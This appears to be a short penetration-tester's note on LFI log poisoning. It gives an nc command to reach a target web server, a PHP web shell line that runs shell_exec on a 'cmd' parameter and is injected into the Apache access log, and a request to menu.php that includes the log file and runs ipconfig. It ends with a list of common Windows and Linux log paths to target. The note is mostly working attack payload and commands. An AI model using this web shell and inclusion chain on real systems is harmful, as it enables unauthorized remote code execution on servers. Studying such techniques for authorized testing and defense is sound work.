#### Connect with nc and poison the log:
```bash
nc -nv $TARGET 80
```
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```
What the log file looks like:
![[Pasted image 20220506100915.png]]
```bash
http://$TARGET/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```
Common log locations:
Windows xampp
`c:\xampp\apache\logs\access.log`
Linux locations
`/var/log/apache2/access.log`
`/var/log/apache/access.log`
`/var/log/apache/error.log`
`/var/log/apache2/access.log`
`/var/log/apache2/error.log`
`/var/log/nginx/access.log`
`/var/log/nginx/error.log`
`/var/log/vsftpd.log`
`/var/log/sshd.log`
`/var/log/mail`
`/var/log/httpd/error_log`
`/usr/local/apache/log/error_log`
`/usr/local/apache2/log/error_log`